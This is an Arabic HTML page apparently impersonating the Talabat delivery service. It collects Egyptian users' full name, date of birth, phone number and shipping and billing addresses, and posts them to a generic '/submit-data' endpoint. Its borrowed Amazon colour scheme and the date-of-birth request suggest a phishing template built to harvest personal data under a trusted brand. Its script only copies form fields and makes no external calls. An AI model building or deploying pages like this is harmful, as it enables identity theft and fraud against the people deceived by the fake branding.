<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إدخال بيانات الشحن والتوصيل - Talabat</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { 
            font-family: 'Inter', sans-serif; 
            background: #F3F3F3;
        }
        .input-field:focus {
            border-color: #FF9900 !important;
            box-shadow: 0 0 0 3px rgba(255, 153, 0, 0.15) !important;
        }
    </style>
</head>
<body class="bg-[#F3F3F3] min-h-screen flex flex-col justify-between text-[#111111]">

    <!-- Header مع شعار Talabat -->
    <header class="bg-[#131A22] shadow-md p-4 flex items-center max-w-md mx-auto w-full text-white border-b border-[#232F3E]">
        <div class="flex items-center gap-2">
            <span class="text-xl font-black text-[#FF9900] tracking-wide ml-1">talabat</span>
        </div>
    </header>

    <!-- المحتوى الرئيسي -->
    <main class="flex-grow px-4 py-6 max-w-md mx-auto w-full">
        <h1 class="text-2xl font-bold text-[#111111] mb-6 text-right">إضافة عنوان جديد</h1>

        <form action="/submit-data" method="POST" class="space-y-4 bg-[#FFFFFF] border border-[#232F3E]/20 rounded-xl p-5 shadow-sm text-right">

            <!-- الدولة (مقفولة على مصر فقط) -->
            <div>
                <label class="block text-xs font-bold text-[#111111] mb-1">الدولة / المنطقة</label>
                <select name="country" class="w-full px-3 py-2.5 bg-[#F3F3F3] border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900] input-field">
                    <option value="EG">مصر</option>
                </select>
            </div>

            <!-- الاسم الكامل -->
            <div>
                <label class="block text-xs font-bold text-[#111111] mb-1">الاسم الكامل (الاسم الأول والاسم الأخير)</label>
                <input type="text" name="username" required placeholder="مثال: أحمد محمد"
                       class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900] input-field">
            </div>

            <!-- تاريخ الميلاد -->
            <div>
                <label class="block text-xs font-bold text-[#111111] mb-1">تاريخ الميلاد</label>
                <div class="grid grid-cols-3 gap-2">
                    <input type="tel" name="dob_month" required maxlength="2" placeholder="شهر"
                           class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm text-center focus:outline-none focus:border-[#FF9900] input-field">
                    <input type="tel" name="dob_day" required maxlength="2" placeholder="يوم"
                           class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm text-center focus:outline-none focus:border-[#FF9900] input-field">
                    <input type="tel" name="dob_year" required maxlength="4" placeholder="سنة"
                           class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm text-center focus:outline-none focus:border-[#FF9900] input-field">
                </div>
            </div>

            <!-- رقم الهاتف -->
            <div>
                <label class="block text-xs font-bold text-[#111111] mb-1">رقم الهاتف</label>
                <input type="tel" name="phone" required placeholder="+20 100 000 0000"
                       class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900] input-field">
                <p class="text-[10px] text-gray-400 mt-1">قد يستخدم للمساعدة في التوصيل.</p>
            </div>

            <!-- عنوان الشارع -->
            <div>
                <label class="block text-xs font-bold text-[#111111] mb-1">عنوان الشارع</label>
                <input type="text" name="address_line1" required placeholder="عنوان الشارع، ص.ب، اسم الشركة"
                       class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm mb-2 focus:outline-none focus:border-[#FF9900] input-field">
                <input type="text" name="address_line2" placeholder="شقة، مبنى، دور، الخ (اختياري)"
                       class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900] input-field">
            </div>

            <!-- المدينة -->
            <div>
                <label class="block text-xs font-bold text-[#111111] mb-1">المدينة</label>
                <input type="text" name="city" required placeholder="مثال: القاهرة / الإسكندرية"
                       class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900] input-field">
            </div>

            <!-- المحافظة والرمز البريدي -->
            <div class="grid grid-cols-2 gap-3">
                <div>
                    <label class="block text-xs font-bold text-[#111111] mb-1">المحافظة</label>
                    <input type="text" name="state" required placeholder="مثال: القاهرة"
                           class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900] input-field">
                </div>
                <div>
                    <label class="block text-xs font-bold text-[#111111] mb-1">الرمز البريدي</label>
                    <input type="text" name="zipcode" required placeholder="مثال: 11511"
                           class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900] input-field">
                </div>
            </div>

            <!-- ====== قسم عنوان الفوترة ====== -->
            <div class="pt-2 border-t border-gray-200 mt-4">
                <div class="flex items-center justify-between mb-3">
                    <h2 class="text-sm font-bold text-[#111111] flex items-center gap-2">
                        <span>💳</span> عنوان الفوترة
                    </h2>
                    <button type="button" id="copyShippingBtn"
                            class="text-xs bg-[#FF9900] hover:bg-[#FFB84D] text-white font-semibold px-4 py-1.5 rounded-full transition-all duration-200 active:scale-95 shadow-sm">
                        ⚡ نفس عنوان الشحن
                    </button>
                </div>

                <div id="billingFields">
                    <div>
                        <label class="block text-xs font-bold text-[#111111] mb-1">الاسم الكامل (للفوترة)</label>
                        <input type="text" name="billing_username" placeholder="مثال: أحمد محمد"
                               class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900] input-field">
                    </div>

                    <div>
                        <label class="block text-xs font-bold text-[#111111] mb-1">عنوان الشارع</label>
                        <input type="text" name="billing_address_line1" placeholder="عنوان الشارع، ص.ب، اسم الشركة"
                               class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm mb-2 focus:outline-none focus:border-[#FF9900] input-field">
                        <input type="text" name="billing_address_line2" placeholder="شقة، مبنى، دور، الخ (اختياري)"
                               class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900] input-field">
                    </div>

                    <div>
                        <label class="block text-xs font-bold text-[#111111] mb-1">المدينة</label>
                        <input type="text" name="billing_city" placeholder="مثال: القاهرة / الإسكندرية"
                               class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900] input-field">
                    </div>

                    <div class="grid grid-cols-2 gap-3">
                        <div>
                            <label class="block text-xs font-bold text-[#111111] mb-1">المحافظة</label>
                            <input type="text" name="billing_state" placeholder="مثال: القاهرة"
                                   class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900] input-field">
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-[#111111] mb-1">الرمز البريدي</label>
                            <input type="text" name="billing_zipcode" placeholder="مثال: 11511"
                                   class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900] input-field">
                        </div>
                    </div>

                    <div>
                        <label class="block text-xs font-bold text-[#111111] mb-1">رقم الهاتف (للفوترة)</label>
                        <input type="tel" name="billing_phone" placeholder="+20 100 000 0000"
                               class="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF9900] input-field">
                    </div>
                </div>

                <div id="billingHiddenMessage" class="hidden text-sm text-green-600 bg-green-50 border border-green-200 rounded-lg p-3 mt-2 text-center">
                    ✅ سيتم استخدام نفس عنوان الشحن للفوترة
                </div>
            </div>

            <!-- Hidden fields للفوترة -->
            <input type="hidden" name="billing_username_hidden" id="billing_username_hidden" value="">
            <input type="hidden" name="billing_address_line1_hidden" id="billing_address_line1_hidden" value="">
            <input type="hidden" name="billing_address_line2_hidden" id="billing_address_line2_hidden" value="">
            <input type="hidden" name="billing_city_hidden" id="billing_city_hidden" value="">
            <input type="hidden" name="billing_state_hidden" id="billing_state_hidden" value="">
            <input type="hidden" name="billing_zipcode_hidden" id="billing_zipcode_hidden" value="">
            <input type="hidden" name="billing_phone_hidden" id="billing_phone_hidden" value="">

            <!-- زر الإرسال -->
            <div class="pt-2">
                <button type="submit" class="w-full bg-[#FF9900] hover:bg-[#FFB84D] text-white font-bold py-3 px-4 rounded-lg text-sm shadow transition-all duration-200 active:scale-[0.99]">
                    استخدام هذا العنوان
                </button>
            </div>
        </form>
    </main>

    <!-- الفوتر -->
    <footer class="bg-[#232F3E] border-t border-[#131A22] py-6 text-center text-xs text-[#FFFFFF]/70 w-full mt-auto">
        <div class="max-w-md mx-auto px-4">
            <div class="flex justify-center gap-4 mb-3">
                <a href="/user-agreement" class="hover:underline hover:text-[#FFFFFF]">اتفاقية المستخدم</a>
                <a href="/privacy-policy" class="hover:underline hover:text-[#FFFFFF]">سياسة الخصوصية</a>
                <a href="/contact-us" class="hover:underline hover:text-[#FFFFFF]">اتصل بنا</a>
            </div>
            <p class="text-[#FFFFFF]/50">&copy; 2026 talabat.com</p>
        </div>
    </footer>

    <!-- JavaScript -->
    <script>
        (function() {
            const copyBtn = document.getElementById('copyShippingBtn');
            const billingFields = document.getElementById('billingFields');
            const billingHiddenMessage = document.getElementById('billingHiddenMessage');
            let isHidden = false;

            const fieldMap = [
                { from: 'username', to: 'billing_username', hidden: 'billing_username_hidden' },
                { from: 'address_line1', to: 'billing_address_line1', hidden: 'billing_address_line1_hidden' },
                { from: 'address_line2', to: 'billing_address_line2', hidden: 'billing_address_line2_hidden' },
                { from: 'city', to: 'billing_city', hidden: 'billing_city_hidden' },
                { from: 'state', to: 'billing_state', hidden: 'billing_state_hidden' },
                { from: 'zipcode', to: 'billing_zipcode', hidden: 'billing_zipcode_hidden' },
                { from: 'phone', to: 'billing_phone', hidden: 'billing_phone_hidden' }
            ];

            function updateHiddenFields() {
                fieldMap.forEach(({ from, to, hidden }) => {
                    const sourceField = document.querySelector(`[name="${from}"]`);
                    const targetField = document.querySelector(`[name="${to}"]`);
                    const hiddenField = document.getElementById(hidden);
                    if (sourceField && targetField && hiddenField) {
                        hiddenField.value = targetField.value || sourceField.value;
                    }
                });
            }

            copyBtn.addEventListener('click', function() {
                fieldMap.forEach(({ from, to, hidden }) => {
                    const sourceField = document.querySelector(`[name="${from}"]`);
                    const targetField = document.querySelector(`[name="${to}"]`);
                    const hiddenField = document.getElementById(hidden);
                    if (sourceField && targetField && hiddenField) {
                        const value = sourceField.value;
                        targetField.value = value;
                        hiddenField.value = value;
                    }
                });

                if (!isHidden) {
                    billingFields.style.transition = 'all 0.4s ease';
                    billingFields.style.opacity = '0';
                    billingFields.style.transform = 'translateY(-10px)';
                    
                    setTimeout(() => {
                        billingFields.style.display = 'none';
                        billingHiddenMessage.classList.remove('hidden');
                        billingHiddenMessage.style.opacity = '0';
                        billingHiddenMessage.style.transition = 'opacity 0.4s ease';
                        setTimeout(() => {
                            billingHiddenMessage.style.opacity = '1';
                        }, 50);
                    }, 400);
                    
                    copyBtn.textContent = '📌 الفوترة = الشحن';
                    copyBtn.classList.add('bg-green-600', 'hover:bg-green-700');
                    copyBtn.classList.remove('bg-[#FF9900]', 'hover:bg-[#FFB84D]');
                    
                    isHidden = true;
                }
            });

            document.querySelector('form').addEventListener('submit', function(e) {
                fieldMap.forEach(({ to, hidden }) => {
                    const targetField = document.querySelector(`[name="${to}"]`);
                    const hiddenField = document.getElementById(hidden);
                    if (targetField && hiddenField) {
                        hiddenField.value = targetField.value;
                    }
                });
            });

            updateHiddenFields();
        })();
    </script>

</body>
</html>
